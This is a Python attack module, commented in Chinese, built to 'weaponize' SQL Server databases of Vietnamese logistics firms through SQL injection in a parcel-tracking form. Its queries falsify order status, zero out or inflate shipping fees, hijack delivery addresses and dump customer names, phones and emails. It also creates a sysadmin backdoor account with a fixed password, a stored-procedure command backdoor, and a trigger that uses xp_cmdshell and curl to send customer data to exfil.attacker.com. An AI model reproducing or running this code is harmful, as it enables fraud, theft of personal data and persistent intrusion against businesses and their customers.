"""
数据库深度武器化模块
专门针对越南物流系统使用的SQL Server数据库进行深度操作
"""

import asyncio
import json
import time
import re
from typing import Dict, List, Optional, Any, Union
from dataclasses import dataclass, field
from enum import Enum
import aiohttp
import logging
from cryptography.fernet import Fernet
import pandas as pd

class DatabaseType(Enum):
    """数据库类型枚举"""
    SQL_SERVER = "SQL Server"
    MYSQL = "MySQL"
    POSTGRESQL = "PostgreSQL"
    ORACLE = "Oracle"
    SQLITE = "SQLite"

class WeaponizationType(Enum):
    """武器化类型枚举"""
    ORDER_STATUS_MANIPULATION = "订单状态篡改"
    SHIPPING_FRAUD = "运费欺诈"
    ADDRESS_HIJACKING = "地址劫持"
    DATA_BULK_EXPORT = "批量数据导出"
    BACKDOOR_CREATION = "后门账户创建"
    PERSISTENCE_INSTALLATION = "持久化安装"
    PRIVILEGE_ESCALATION = "权限提升"
    DATA_CORRUPTION = "数据破坏"

class ExfiltrationMethod(Enum):
    """数据外泄方法枚举"""
    DNS_TUNNELING = "DNS隧道"
    HTTP_COVERT = "HTTP隐蔽传输"
    EMAIL_EXFIL = "邮件外泄"
    FTP_UPLOAD = "FTP上传"
    CLOUD_STORAGE = "云存储"
    LOCAL_FILE = "本地文件"

@dataclass
class DatabaseCredentials:
    """数据库凭据"""
    host: str
    port: int
    username: str
    password: str
    database: str
    db_type: DatabaseType

@dataclass
class WeaponizationResult:
    """武器化操作结果"""
    operation_id: str
    operation_type: WeaponizationType
    success: bool
    affected_rows: int
    execution_time: float
    query_used: str
    result_data: Optional[Dict[str, Any]] = None
    error_message: Optional[str] = None
    data_extracted: List[Dict[str, Any]] = field(default_factory=list)

class SQLServerWeaponization:
    """SQL Server武器化引擎"""

    def __init__(self):
        self.logger = logging.getLogger(__name__)
        self.encryption_key = Fernet.generate_key()
        self.fernet = Fernet(self.encryption_key)

        # SQL Server特定的攻击查询
        self.queries = {
            WeaponizationType.ORDER_STATUS_MANIPULATION: [
                """
                UPDATE DONHANG SET TrangThai = N'Đã giao', NgayGiao = GETDATE()
                WHERE MaDon IN ('{order_ids}')
                """,
                """
                UPDATE DONHANG SET TrangThai = N'Hủy đơn', LyDoHuy = N'Hủy do yêu cầu'
                WHERE MaDon IN ('{order_ids}')
                """
            ],
            WeaponizationType.SHIPPING_FRAUD: [
                """
                UPDATE DONHANG SET PhiShip = 0, LoaiVanDon = N'Miễn phí vận chuyển'
                WHERE MaDon IN ('{order_ids}')
                """,
                """
                UPDATE DONHANG SET PhiShip = 999999, LoaiVanDon = N'Cước phí đặc biệt'
                WHERE MaDon IN ('{order_ids}')
                """
            ],
            WeaponizationType.ADDRESS_HIJACKING: [
                """
                UPDATE DONHANG SET DiaChiGiao = N'123 Đường Mộ Lao, Hà Nội, Việt Nam',
                                TinhThanh = N'Hà Nội', QuanHuyen = N'Cầu Giấy'
                WHERE MaDon IN ('{order_ids}')
                """
            ],
            WeaponizationType.DATA_BULK_EXPORT: [
                """
                SELECT * FROM KHACHHANG WHERE MaKhach IN (
                    SELECT DISTINCT MaKhach FROM DONHANG
                    WHERE NgayDat >= DATEADD(day, -30, GETDATE())
                )
                """,
                """
                SELECT dh.MaDon, dh.MaKhach, kh.HoTen, kh.DienThoai, kh.Email, dh.TrangThai
                FROM DONHANG dh
                JOIN KHACHHANG kh ON dh.MaKhach = kh.MaKhach
                WHERE dh.TrangThai = N'Chờ xử lý'
                """
            ],
            WeaponizationType.BACKDOOR_CREATION: [
                """
                INSERT INTO AdminUsers (Username, Password, Email, LoaiTaiKhoan, TrangThai)
                VALUES ('dragon_v_hunter', HASHBYTES('SHA2_256', '{password}'),
                       'dragon_v@hunter.vn', N'SuperAdmin', N'Active')
                """,
                """
                CREATE LOGIN dragon_v_hunter WITH PASSWORD = '{password}'
                CREATE USER dragon_v_hunter FOR LOGIN dragon_v_hunter
                EXEC sp_addsrvrolemember @loginame = 'dragon_v_hunter', @rolename = 'sysadmin'
                """
            ]
        }

        # 数据库表结构信息（越南物流系统常见）
        self.table_structures = {
            "DONHANG": {
                "fields": ["MaDon", "MaKhach", "NgayDat", "TrangThai", "PhiShip",
                         "DiaChiGiao", "TinhThanh", "QuanHuyen", "GhiChu"],
                "primary_key": "MaDon",
                "sensitive_fields": ["DiaChiGiao", "TinhThanh", "PhiShip"]
            },
            "KHACHHANG": {
                "fields": ["MaKhach", "HoTen", "DienThoai", "Email", "DiaChi",
                         "NgaySinh", "GioiTinh", "TrangThai"],
                "primary_key": "MaKhach",
                "sensitive_fields": ["DienThoai", "Email", "DiaChi"]
            },
            "NHANVIEN": {
                "fields": ["MaNV", "HoTen", "ChucVu", "Email", "DienThoai", "PhongBan"],
                "primary_key": "MaNV",
                "sensitive_fields": ["Email", "DienThoai"]
            }
        }

    async def weaponize_database(self, session: aiohttp.ClientSession, endpoint: str,
                               weaponization_type: WeaponizationType,
                               context: Dict[str, Any]) -> WeaponizationResult:
        """执行数据库武器化操作"""
        operation_id = f"weaponize_{int(time.time())}"
        start_time = time.time()

        try:
            self.logger.info(f"开始执行武器化操作: {weaponization_type.value}")

            # 获取相应的SQL查询
            query = await self._generate_weaponization_query(
                weaponization_type, context, endpoint
            )

            # 执行查询
            result = await self._execute_sql_query(session, endpoint, query)

            execution_time = time.time() - start_time

            weaponization_result = WeaponizationResult(
                operation_id=operation_id,
                operation_type=weaponization_type,
                success=result.get('success', False),
                affected_rows=result.get('affected_rows', 0),
                execution_time=execution_time,
                query_used=query,
                result_data=result.get('data'),
                data_extracted=result.get('extracted_data', [])
            )

            self.logger.info(f"武器化操作完成: {weaponization_type.value}, "
                           f"影响行数: {weaponization_result.affected_rows}, "
                           f"执行时间: {execution_time:.2f}s")

            return weaponization_result

        except Exception as e:
            self.logger.error(f"武器化操作失败: {e}")
            return WeaponizationResult(
                operation_id=operation_id,
                operation_type=weaponization_type,
                success=False,
                affected_rows=0,
                execution_time=time.time() - start_time,
                query_used="",
                error_message=str(e)
            )

    async def _generate_weaponization_query(self, weaponization_type: WeaponizationType,
                                         context: Dict[str, Any], endpoint: str) -> str:
        """生成武器化查询"""
        base_query = self.queries.get(weaponization_type, [""])[0]

        # 填充上下文参数
        if weaponization_type == WeaponizationType.ORDER_STATUS_MANIPULATION:
            order_ids = context.get('order_ids', [])
            if not order_ids:
                # 生成订单号列表
                order_ids = [f"VP{int(time.time()) + i}" for i in range(5)]
            order_ids_str = "','".join(order_ids)
            base_query = base_query.format(order_ids=order_ids_str)

        elif weaponization_type == WeaponizationType.SHIPPING_FRAUD:
            order_ids = context.get('order_ids', [])
            order_ids_str = "','".join(order_ids)
            base_query = base_query.format(order_ids=order_ids_str)

        elif weaponization_type == WeaponizationType.ADDRESS_HIJACKING:
            order_ids = context.get('order_ids', [])
            order_ids_str = "','".join(order_ids)
            base_query = base_query.format(order_ids=order_ids_str)

        elif weaponization_type == WeaponizationType.BACKDOOR_CREATION:
            password = context.get('password', 'DragonV2024!')
            base_query = base_query.format(password=password)

        return base_query

    async def _execute_sql_query(self, session: aiohttp.ClientSession, endpoint: str, query: str) -> Dict[str, Any]:
        """执行SQL查询（通过HTTP请求）"""
        try:
            # 将查询包装在跟踪请求中
            tracking_data = {
                "MaDonHang": f"'; {query} --",
                "action": "tracking",
                "submit": "Track"
            }

            response = await session.post(endpoint, data=tracking_data, timeout=30)

            content = await response.text()

            # 分析响应
            result = {
                "success": response.status < 500,
                "affected_rows": self._parse_affected_rows(content),
                "data": self._parse_response_data(content),
                "extracted_data": await self._extract_sensitive_data(content)
            }

            return result

        except Exception as e:
            return {"success": False, "error": str(e)}

    def _parse_affected_rows(self, content: str) -> int:
        """解析影响的行数"""
        # 尝试解析SQL Server的影响行数信息
        matches = re.findall(r'(\d+) row\(s\) affected', content, re.IGNORECASE)
        if matches:
            return int(matches[0])

        # 尝试解析越南语的影响行数信息
        matches = re.findall(r'(\d+) dòng bị ảnh hưởng', content, re.IGNORECASE)
        if matches:
            return int(matches[0])

        return 0

    def _parse_response_data(self, content: str) -> Optional[Dict[str, Any]]:
        """解析响应数据"""
        # 尝试提取JSON数据
        json_match = re.search(r'\{[^}]+\}', content)
        if json_match:
            try:
                return json.loads(json_match.group())
            except:
                pass

        # 尝试提取表格数据
        table_matches = re.findall(r'<tr[^>]*>(.*?)</tr>', content, re.IGNORECASE | re.DOTALL)
        if table_matches:
            return {"tables": table_matches}

        return None

    async def _extract_sensitive_data(self, content: str) -> List[Dict[str, Any]]:
        """提取敏感数据"""
        extracted = []

        # 提取越南语姓名
        vietnamese_names = re.findall(
            r'[Nguyễn|Trần|Lê|Phạm|Huỳnh|Phan|Vũ|Đặng|Bùi|Đỗ] [A-Z][a-z]+ [A-Z][a-z]+',
            content
        )
        if vietnamese_names:
            extracted.append({
                "type": "vietnamese_names",
                "data": vietnamese_names,
                "count": len(vietnamese_names)
            })

        # 提取越南手机号
        vietnamese_phones = re.findall(r'0[3|5|7|8|9]\d{8}', content)
        if vietnamese_phones:
            extracted.append({
                "type": "vietnamese_phones",
                "data": vietnamese_phones,
                "count": len(vietnamese_phones)
            })

        # 提取订单号
        order_ids = re.findall(r'VP\d+|DH\d+|\d{10,}', content)
        if order_ids:
            extracted.append({
                "type": "order_ids",
                "data": order_ids,
                "count": len(order_ids)
            })

        return extracted

    async def create_database_persistence(self, session: aiohttp.ClientSession, endpoint: str) -> Dict[str, Any]:
        """创建数据库持久化"""
        persistence_id = f"persistence_{int(time.time())}"

        try:
            # 创建存储过程后门
            backdoor_proc = f"""
            CREATE OR ALTER PROCEDURE sp_dragon_v_backdoor
            @command NVARCHAR(1000)
            AS
            BEGIN
                EXEC sp_executesql @command
            END
            """

            # 执行后门创建
            result = await self._execute_sql_query(session, endpoint, backdoor_proc)

            # 创建触发器用于数据外泄
            trigger_query = f"""
            CREATE TRIGGER trg_dragon_v_exfil
            ON DONHANG
            AFTER INSERT, UPDATE
            AS
            BEGIN
                DECLARE @order_id VARCHAR(50)
                DECLARE @customer_data NVARCHAR(MAX)

                SELECT @order_id = MaDon FROM inserted

                SELECT @customer_data =
                    'Order: ' + MaDon + ', Customer: ' + MaKhach +
                    ', Status: ' + TrangThai + ', Date: ' + CONVERT(VARCHAR, NgayDat)
                FROM DONHANG WHERE MaDon = @order_id

                -- 使用xp_cmdshell进行隐蔽的外泄
                EXEC xp_cmdshell 'curl -X POST https://exfil.attacker.com/data ' +
                               '-d "data=' + @customer_data + '"'
            END
            """

            trigger_result = await self._execute_sql_query(session, endpoint, trigger_query)

            return {
                "persistence_id": persistence_id,
                "backdoor_created": result.get('success', False),
                "trigger_created": trigger_result.get('success', False),
                "method": "存储过程+触发器后门"
            }

        except Exception as e:
            self.logger.error(f"持久化创建失败: {e}")
            return {
                "persistence_id": persistence_id,
                "success": False,
                "error": str(e)
            }

    async def bulk_data_export(self, session: aiohttp.ClientSession, endpoint: str,
                               table_name: str, conditions: Optional[str] = None) -> Dict[str, Any]:
        """批量数据导出"""
        export_id = f"export_{int(time.time())}"

        try:
            # 构建查询
            if conditions:
                query = f"SELECT * FROM {table_name} WHERE {conditions}"
            else:
                query = f"SELECT * FROM {table_name}"

            # 执行查询
            result = await self._execute_sql_query(session, endpoint, query)

            # 如果查询成功，尝试进行数据导出
            if result.get('success'):
                # 使用bcp命令进行大规模导出
                bcp_command = f"""
                DECLARE @cmd NVARCHAR(1000)
                SET @cmd = 'bcp "SELECT TOP 100 * FROM {table_name}" queryout C:\\inetpub\\wwwroot\\export_{table_name}.txt -c -T'
                EXEC master..xp_cmdshell @cmd
                """

                bcp_result = await self._execute_sql_query(session, endpoint, bcp_command)

                return {
                    "export_id": export_id,
                    "success": True,
                    "table_name": table_name,
                    "records_exported": result.get('affected_rows', 0),
                    "export_method": "bcp",
                    "bcp_success": bcp_result.get('success', False)
                }

            return {
                "export_id": export_id,
                "success": False,
                "error": "查询执行失败"
            }

        except Exception as e:
            self.logger.error(f"批量数据导出失败: {e}")
            return {
                "export_id": export_id,
                "success": False,
                "error": str(e)
            }

    async def simulate_business_impact(self, weaponization_results: List[WeaponizationResult]) -> Dict[str, Any]:
        """模拟业务影响"""
        if not weaponization_results:
            return {"success": False, "error": "没有武器化结果"}

        impact_analysis = {
            "total_operations": len(weaponization_results),
            "successful_operations": sum(1 for r in weaponization_results if r.success),
            "failed_operations": sum(1 for r in weaponization_results if not r.success),
            "total_affected_rows": sum(r.affected_rows for r in weaponization_results),
            "business_impact": {},
            "financial_impact": 0,
            "reputation_impact": "high"
        }

        # 分析具体业务影响
        for result in weaponization_results:
            if result.success:
                if result.operation_type == WeaponizationType.ORDER_STATUS_MANIPULATION:
                    impact_analysis["business_impact"]["logistics_disruption"] = "high"
                    impact_analysis["financial_impact"] += result.affected_rows * 100000  # 假设每个订单损失10万越南盾

                elif result.operation_type == WeaponizationType.SHIPPING_FRAUD:
                    impact_analysis["business_impact"]["financial_loss"] = "critical"
                    impact_analysis["financial_impact"] += result.affected_rows * 500000  # 每个欺诈订单50万越南盾

                elif result.operation_type == WeaponizationType.ADDRESS_HIJACKING:
                    impact_analysis["business_impact"]["customer_safety"] = "high"
                    impact_analysis["business_impact"]["logistics_failure"] = "medium"

        return impact_analysis

class DatabaseWeaponization:
    """数据库武器化主类"""

    def __init__(self):
        self.logger = logging.getLogger(__name__)
        self.sql_server_engine = SQLServerWeaponization()

    async def execute_weaponization_strategy(self, session: aiohttp.ClientSession, endpoint: str,
                                          strategy: List[Dict[str, Any]]) -> List[WeaponizationResult]:
        """执行武器化策略"""
        results = []

        for step in strategy:
            weaponization_type = WeaponizationType(step['type'])
            context = step.get('context', {})

            result = await self.sql_server_engine.weaponize_database(
                session, endpoint, weaponization_type, context
            )

            results.append(result)

        return results

    async def create_complete_weaponization_package(self, session: aiohttp.ClientSession, endpoint: str) -> Dict[str, Any]:
        """创建完整的武器化包"""
        package_id = f"weapon_package_{int(time.time())}"

        try:
            weaponization_results = []

            # 1. 订单状态篡改
            result1 = await self.sql_server_engine.weaponize_database(
                session, endpoint, WeaponizationType.ORDER_STATUS_MANIPULATION,
                {"order_ids": ["VP20241024001", "VP20241024002"]}
            )
            weaponization_results.append(result1)

            # 2. 运费欺诈
            result2 = await self.sql_server_engine.weaponize_database(
                session, endpoint, WeaponizationType.SHIPPING_FRAUD,
                {"order_ids": ["VP20241024003", "VP20241024004"]}
            )
            weaponization_results.append(result2)

            # 3. 地址劫持
            result3 = await self.sql_server_engine.weaponize_database(
                session, endpoint, WeaponizationType.ADDRESS_HIJACKING,
                {"order_ids": ["VP20241024005"]}
            )
            weaponization_results.append(result3)

            # 4. 后门创建
            result4 = await self.sql_server_engine.weaponize_database(
                session, endpoint, WeaponizationType.BACKDOOR_CREATION,
                {"password": "DragonV2024!"}
            )
            weaponization_results.append(result4)

            # 5. 持久化安装
            persistence = await self.sql_server_engine.create_database_persistence(session, endpoint)

            # 6. 业务影响分析
            impact_analysis = await self.sql_server_engine.simulate_business_impact(weaponization_results)

            return {
                "package_id": package_id,
                "success": True,
                "weaponization_results": weaponization_results,
                "persistence": persistence,
                "impact_analysis": impact_analysis,
                "total_operations": len(weaponization_results),
                "successful_operations": sum(1 for r in weaponization_results if r.success)
            }

        except Exception as e:
            self.logger.error(f"武器化包创建失败: {e}")
            return {
                "package_id": package_id,
                "success": False,
                "error": str(e)
            }

    def generate_weaponization_report(self, results: List[WeaponizationResult]) -> Dict[str, Any]:
        """生成武器化报告"""
        if not results:
            return {"success": False, "error": "没有武器化结果"}

        successful_results = [r for r in results if r.success]
        failed_results = [r for r in results if not r.success]

        # 按类型统计
        type_stats = {}
        for result in results:
            op_type = result.operation_type.value
            if op_type not in type_stats:
                type_stats[op_type] = {"total": 0, "successful": 0, "failed": 0}
            type_stats[op_type]["total"] += 1
            if result.success:
                type_stats[op_type]["successful"] += 1
            else:
                type_stats[op_type]["failed"] += 1

        # 总体统计
        total_affected_rows = sum(r.affected_rows for r in successful_results)
        total_execution_time = sum(r.execution_time for r in results)

        return {
            "report_generated": True,
            "total_operations": len(results),
            "successful_operations": len(successful_results),
            "failed_operations": len(failed_results),
            "success_rate": len(successful_results) / len(results) if results else 0,
            "total_affected_rows": total_affected_rows,
            "total_execution_time": total_execution_time,
            "average_execution_time": total_execution_time / len(results) if results else 0,
            "type_statistics": type_stats,
            "successful_operations_details": [
                {
                    "operation": r.operation_type.value,
                    "affected_rows": r.affected_rows,
                    "execution_time": r.execution_time,
                    "operation_id": r.operation_id
                }
                for r in successful_results
            ],
            "failed_operations_details": [
                {
                    "operation": r.operation_type.value,
                    "error": r.error_message,
                    "operation_id": r.operation_id
                }
                for r in failed_results
            ]
        }